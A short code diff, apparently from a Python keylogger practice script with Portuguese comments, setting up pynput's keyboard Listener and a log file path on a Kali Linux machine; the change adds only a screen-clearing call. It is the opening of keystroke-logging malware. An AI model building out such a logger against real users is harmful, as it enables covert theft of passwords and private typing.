@@ -1,5 +1,8 @@
 #em pynput, importar o método Listener do teclado
+import os
 from pynput.keyboard import Listener
+
+os.system('cls' if os.name == 'nt' else 'clear')
 
 #defina a localização do arquivo de log
 logFile = "/home/kali/penis.txt"
